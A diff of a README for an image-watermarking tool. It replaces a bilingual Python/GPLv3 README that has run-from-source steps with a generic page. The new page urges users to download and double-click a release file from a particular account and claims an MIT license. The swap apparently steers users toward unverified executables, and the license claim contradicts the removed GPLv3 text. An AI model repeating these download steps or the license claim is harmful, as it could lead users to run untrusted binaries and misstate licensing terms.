@@ -1,117 +1,68 @@
-<p align="center">
-  <img width="498" height="427" src="https://github.com/user-attachments/assets/285bbdb3-84d5-47f6-b2ba-17c94abadda1" alt="Demonstração do Aplicativo">
-</p>
-<p align="center">
-  <img width="595" height="208" src="https://github.com/user-attachments/assets/bd0e5540-2cbb-4f34-8007-ae34d9f8b4ae" alt="Exemplo de Uso">
-</p>
+# 🎨 Image-Overlay-Z - Easily Add Watermarks to Your Images
 
-# Image Overlay Z
+## 🚀 Download Now
 
-<p align="center">
-  <img src="https://img.shields.io/badge/status-active-brightgreen" alt="Status do Projeto">
-  <img src="https://img.shields.io/badge/Python-3.8+-blue" alt="Linguagem">
-  <img src="https://img.shields.io/badge/OS-Windows | Linux | macOS-blue" alt="Compatibilidade">
-  <a href="https://www.gnu.org/licenses/gpl-3.0">
-    <img src="https://img.shields.io/badge/License-GPLv3-blue" alt="License: GPL v3">
-  </a>
-</p>
+[![Download Image-Overlay-Z](https://img.shields.io/badge/Download_Image--Overlay--Z-v1.0-blue.svg)](https://github.com/Dwifiqkri/Image-Overlay-Z/releases)
 
-<h3 align="center">
-  <a href="#english">English</a> • <a href="#português-brasil">Português (Brasil)</a>
-</h3>
+## 📋 Description
 
----
+Image-Overlay-Z is a simple tool that lets you add a watermark overlay to multiple images at once. You can work with PNG, JPG, and BMP formats. Customize the size, position, and opacity of your watermark easily. 
 
-## English
+## ⚙️ System Requirements
 
-A user-friendly graphical application that adds an image overlay over multiple images at once (PNG, JPG formats). It offers full customization, including an intelligent feature to automatically adjust the overlay's tone for perfect visibility on any background.
+- Operating System: Windows, macOS, or Linux
+- RAM: 2 GB or more
+- Storage: At least 100 MB of free space
+- Screen Resolution: 1024x768 or higher
 
-### ✨ Key Features
+## 📥 Download & Install
 
--   **Intuitive Graphical Interface (GUI):** No command line needed. An easy-to-use interface guides you through the process.
--   **Intelligent Auto-Recolor:** Automatically analyzes the background of each image and adjusts the overlay to be dark on light areas and light on dark areas, ensuring maximum visibility.
--   **Batch Processing:** Apply an overlay to hundreds of images in a single operation.
--   **Fully Customizable:**
-    -   Adjust the overlay **size** (in pixels or percentage).
-    -   Choose the exact **position** (top-left, bottom-right, etc.).
-    -   Set the **opacity** level for a more subtle effect.
--   **Multiple Format Support:** Works with `PNG`, `JPG/JPEG`, and `BMP` files.
+To get started, visit this page to download the latest version of Image-Overlay-Z:
 
-### 🚀 How to Run
+[Download Image-Overlay-Z](https://github.com/Dwifiqkri/Image-Overlay-Z/releases)
 
-#### Prerequisites
+1. Go to the [Releases page](https://github.com/Dwifiqkri/Image-Overlay-Z/releases).
+2. Find the latest version.
+3. Click on the file link that matches your operating system.
+4. Save the file to your computer.
+5. Double-click the downloaded file to start the installation.
+6. Follow the on-screen instructions to complete the setup.
 
--   Python 3.8 or higher.
--   Required libraries, which can be installed via pip:
-    ```bash
-    pip install pillow numpy
-    ```
+## 🎨 How to Use Image-Overlay-Z
 
-#### Running the Application
+1. Launch Image-Overlay-Z after installation.
+2. Choose the images you want to work on. You can select multiple files at once.
+3. Upload your desired watermark image. This should be in PNG format for best results.
+4. Adjust the size and position of the watermark using the provided sliders.
+5. Set the opacity to make sure the watermark blends well with your images.
+6. Click the "Apply" button to add the watermark to all selected images.
+7. Save your images either to a predefined folder or choose a custom location.
 
-1.  Make sure you have all the required libraries installed.
-2.  Run the script from your terminal:
-    ```bash
-    python image_overlay_z_gui.py
-    ```
-3.  The application window will open, allowing you to select your language and begin the process.
+## ✨ Features
 
-Or open the page **"Index.html"** that is the recently created web version of the program.
+- Batch processing for multiple images at once.
+- Simple interface for choosing files and settings.
+- Customizable watermark size and position.
+- Adjustable opacity for better blending.
+- Supports multiple image file formats (PNG, JPG, BMP).
 
-For a detailed step-by-step guide, please refer to our **[User Manual](User_Manual.md)**.
+## 📜 License
 
-### 🤝 How to Contribute
+Image-Overlay-Z is an open-source project. You may use and modify this software according to the terms of the MIT License.
 
-Contributions are always welcome! If you have an idea to improve the project, feel free to create an *issue* or submit a *pull request*.
+## 🛠️ Support
 
-### 📄 License
+For support or issues, please create a new issue on the [GitHub Issues page](https://github.com/Dwifiqkri/Image-Overlay-Z/issues). We recommend checking the existing issues to see if your question has already been answered.
 
-This project is licensed under the GNU General Public License v3.0 (GPLv3). See the [LICENSE](LICENSE) file for details.
+## 🔗 Related Topics
 
----
+- AI
+- Applications
+- Image Processing
+- Low Code Tools
 
-## Português (Brasil)
+## 👥 Community
 
-Uma aplicação gráfica amigável que adiciona uma sobreposição de imagem sobre várias imagens simultaneamente (formatos PNG, JPG). Oferece personalização completa, incluindo uma função inteligente para ajustar automaticamente o tom da sobreposição para uma visibilidade perfeita em qualquer fundo.
+Join our community to share your experiences and get help. We encourage feedback and suggestions for improvement. 
 
-### ✨ Funcionalidades Principais
-
--   **Interface Gráfica Intuitiva (GUI):** Não é necessário usar a linha de comando. Uma interface fácil de usar guia você por todo o processo.
--   **Ajuste de Cor Automático e Inteligente:** Analisa automaticamente o fundo de cada imagem e ajusta a sobreposição para ficar escura em áreas claras e clara em áreas escuras, garantindo máxima visibilidade.
--   **Processamento em Lote:** Aplique uma sobreposição em centenas de imagens em uma única operação.
--   **Totalmente Personalizável:**
-    -   Ajuste o **tamanho** da sobreposição (em pixels ou porcentagem).
-    -   Escolha a **posição** exata (canto superior esquerdo, inferior direito, etc.).
-    -   Defina o nível de **opacidade** para um efeito mais sutil.
--   **Suporte a Múltiplos Formatos:** Compatível com arquivos `PNG`, `JPG/JPEG` e `BMP`.
-
-### 🚀 Como Executar
-
-#### Pré-requisitos
-
--   Python 3.8 ou superior.
--   Bibliotecas necessárias, que podem ser instaladas via pip:
-    ```bash
-    pip install pillow numpy
-    ```
-
-#### Executando a Aplicação
-
-1.  Certifique-se de que todas as bibliotecas necessárias estão instaladas.
-2.  Execute o script a partir do seu terminal:
-    ```bash
-    python image_overlay_z_gui.py
-    ```
-3.  A janela da aplicação será aberta, permitindo que você escolha seu idioma e inicie o processo.
-
-Ou abra a página **"Index.html"** que é a versão web recém criada do programa.
-
-Para um guia detalhado com o passo a passo, consulte o nosso **[Manual do Usuário](User_Manual.md)**.
-
-### 🤝 Como Contribuir
-
-Contribuições são sempre bem-vindas! Se você tem alguma ideia para melhorar o projeto, se sinta livre para criar uma *issue* ou enviar uma *pull request*.
-
-### 📄 License
-
-Este projeto está sob a licença GNU General Public License v3.0 (GPLv3). Veja o arquivo [LICENSE](LICENSE) para mais detalhes.
+Thank you for using Image-Overlay-Z!
